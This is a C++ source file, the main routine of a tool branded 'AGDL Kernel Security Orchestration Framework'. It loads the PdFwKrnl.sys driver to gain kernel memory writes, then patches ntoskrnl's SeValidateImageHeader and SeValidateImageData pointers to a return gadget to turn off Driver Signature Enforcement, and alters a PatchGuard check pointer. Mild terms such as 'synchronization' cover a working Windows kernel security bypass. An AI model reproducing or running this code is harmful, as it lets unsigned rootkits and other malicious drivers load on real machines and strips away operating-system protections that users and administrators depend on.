#include <Common/Types.hpp>
#include <Driver/KernelMemoryProvider.hpp>
#include <Scanning/SignatureScanner.hpp>
#include <Kernel/KernelEnvironment.hpp>
#include <iostream>
#include <iomanip>

namespace
{
    void PrintAgdlBanner() noexcept
    {
        std::cout << R"(
===========================================================
  AGDL Kernel Security Orchestration Framework
  Developed by Agdl
  DSE / KPP State Synchronization Subsystem [Agdl-Engine]
===========================================================
)" << std::endl;
    }
}

int main(int argc, char* argv[])
{
    PrintAgdlBanner();

    // Step 1: Detect running kernel base
    const auto kernelBase = Agdl::Kernel::AgdlKernelEnvironment::GetKernelBase();
    if (kernelBase == Agdl::Common::InvalidAddress)
    {
        std::cerr << "[-] [Agdl] Error: Unable to query ntoskrnl base address from system.\n";
        return 1;
    }

    std::cout << "[+] [Agdl] Kernel Base Address: 0x"
              << std::hex << std::uppercase << kernelBase << std::dec << "\n";

    // Step 2: Load kernel image for single-pass scanning
    const std::filesystem::path kernelPath = L"C:\\Windows\\System32\\ntoskrnl.exe";
    std::cout << "[*] [Agdl] Inspecting kernel image at: " << kernelPath.string() << "\n";

    Agdl::Scanning::AgdlModuleScanner kernelScanner(kernelPath);
    if (!kernelScanner.IsLoaded())
    {
        std::cerr << "[-] [Agdl] Error: Failed to map kernel image for analysis.\n";
        return 1;
    }

    // Step 3: Resolve offsets via Agdl scanner
    auto offsets = Agdl::Kernel::AgdlKernelEnvironment::ResolveOffsets(kernelScanner);
    if (!offsets.has_value())
    {
        std::cerr << "[-] [Agdl] Error: Signature identification failed for one or more targets.\n";
        return 1;
    }

    std::cout << "[+] [Agdl] Offsets Resolved:\n"
              << "    -> SeValidateImageHeader RVA: 0x" << std::hex << offsets->SeValidateImageHeader << "\n"
              << "    -> SeValidateImageData   RVA: 0x" << offsets->SeValidateImageData << "\n"
              << "    -> RetSuccess Gadget      RVA: 0x" << offsets->RetGadget << "\n"
              << "    -> PatchGuard Check Point RVA: 0x" << offsets->PatchGuardCallback << "\n"
              << "    -> Zero Reference Data    RVA: 0x" << offsets->PatchGuardZeroValue << std::dec << "\n";

    // Step 4: Initialize Agdl Driver Provider
    std::cout << "[*] [Agdl] Initializing kernel provider abstraction (PdFwKrnl)...\n";
    Agdl::Drivers::AgdlKernelMemoryProvider memoryProvider("PdFwKrnl.sys", "PdFwKrnl");

    if (!memoryProvider.Initialize())
    {
        std::cerr << "[-] [Agdl] Error: Kernel driver interface initialization failed.\n";
        return 1;
    }

    std::cout << "[+] [Agdl] Kernel control channel established successfully.\n";

    // Step 5: Apply DSE Overrides
    const auto retGadgetAddress = kernelBase + offsets->RetGadget;

    std::cout << "[*] [Agdl] Applying Driver Signature Enforcement modifications...\n";
    if (!memoryProvider.WriteValue(kernelBase + offsets->SeValidateImageHeader, retGadgetAddress) ||
        !memoryProvider.WriteValue(kernelBase + offsets->SeValidateImageData, retGadgetAddress))
    {
        std::cerr << "[-] [Agdl] Error: Failed modifying CI validation hooks in kernel.\n";
        return 1;
    }

    // Step 6: Apply PatchGuard Nullification
    const auto zeroValueAddress = kernelBase + offsets->PatchGuardZeroValue;
    std::cout << "[*] [Agdl] Synchronizing PatchGuard KdDebugger state pointer...\n";
    if (!memoryProvider.WriteValue(kernelBase + offsets->PatchGuardCallback, zeroValueAddress))
    {
        std::cerr << "[-] [Agdl] Error: Failed adjusting PatchGuard status pointer.\n";
        return 1;
    }

    std::cout << "[+] [Agdl] Pipeline execution completed successfully. Engine armed.\n";
    return 0;
}
